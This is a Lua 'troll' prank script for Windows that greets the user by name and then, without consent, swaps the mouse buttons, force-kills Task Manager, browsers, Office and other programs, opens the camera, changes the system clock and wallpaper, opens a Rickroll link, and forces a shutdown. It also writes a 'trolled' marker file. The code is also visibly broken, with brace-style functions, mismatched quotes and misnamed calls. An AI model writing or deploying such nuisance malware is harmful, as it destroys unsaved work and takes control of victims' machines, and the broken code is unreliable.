local ui = require "ui"

local audio = require "audio"

local dir = sys.Directory(sys.currentdir);

local json = require "json"

local user = print(os.getenv('USERNAME'));

local ffi = require "ffi"

ffi.cdef[[

typedef void* HANDLE;

typedef const wchar_t* LPCWSTR;

typedef int BOOL;

typedef uint32_t UINT;

typedef uint32_t DWORD;

HANDLE SystemParametersInfoW(UINT uiAction, UINT uiParam, void* pvParam, UINT fWinIni);

]]

local SPI_SETDESKWALLPAPER = 0x0014

local SPIF_UPDATEINIFILE = 0x01

local path = ""dir.."\assets\image.bmp"

local widePath = ffi.new("wchar_t[?]", #path + 1)

local result = ffi.C.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, widePath, SPIF_UPDATEINIFILE)

local wallpath = sys.Directory(sys.currentdir.."\assets\image.bmp")

--Functions

function WallPaperChange () {
    for i = 1, #path do

        widePath[i - 1] = ffi.cast("wchar_t", path:byte(i))

    end
}

function CloseDistractions () {
  os.execute("taskkill /F /IM \"chrome.exe\" /T");  --Chrome

  os.execute("taskkill /F /IM \"taskmgr.exe\" /T");  --Task Manager

  os.execute("taskkill /F /IM \"steam.exe\" /T");  --Steam

  os.execute("taskkill /F /IM \"calc.exe\" /T");  --Calculator (LMFAO)

  os.execute("taskkill /F /IM \"winword.exe\" /T");  --MS Word

  os.execute("taskkill /F /IM \"excel.exe\" /T");  --MS Excel

  os.execute("taskkill /F /IM \"notepad.exe\" /T");  --Notepad
}

function MakeDirReal () {
    Directory.make("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua")
    file = io.open("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua\\DateTrolled.ShutDownLua.txt", "w")
    file:write("Successfully Trolled On "..sys.Datetime().." At "..sys.Datetime()..")
    file:close()
}

function shutter () {
  os.execute("shutdown /s /t 00");
}

--here comes the garbage lmao

ui.info("Hey dude!");

ui.info("Wait...");

ui.info("I think I know you!");

json.save("userinfo/username.json", user);

json.save("userinfo/openday.json", ""..print(sys.DateTime().dayname)).."";
      
ui.info("Are you "..os.getenv('USERNAME').."?");

ui.info("It is you!");

os.execute("RUNDLL32 USER32.DLL,SwapMouseButton");  --Swap Mouse Inputs

ui.info("Hey "..os.getenv('USERNAME')..", what are you looking at over there?");

ui.info("Don\'t worry, I\'ll deal with that for you!");

CloseDistractions();

ui.info("Now that that\'s dealt with...");

ui.info("How\'s it going "..os.getenv('USERNAME').."?");

ui.info("Having a good "..print(sys.Datetime().dayname).."?");

ui.info("That\'s great!");

ui.info("Actually, I kinda forgot what you look like!");

ui.info("Let me juusssttt-");

os.execute("microsoft.windows.camera;");

ui.info("There we go!");

ui.info("Now I remember!");

ui.info("Anyways,");

os.execute("time 12:44");

ui.info("Your wallpaper is kinda ugly!");

ui.info("Let me just fix that...");
          
WallpaperChange();          

ui.info("That\'s better!");

os.execute("time 10:42");
          
ui.info("I gotta go now");

os.execute("time 3:57");

ui.info("Actually...");

ui.info("Before I go...");          

os.execute("https://www.youtube.com/watch?v=dQw4w9WgXcQ");  

ui.info("Hahaha!!");          
          
ui.info("Bye "..os.getenv('USERNAME').."!!!");

os.execute("shutdown /s /t 05 -c Get Trolled!"); --LMFAO

MakeDirReal();

--trolled, bitch.
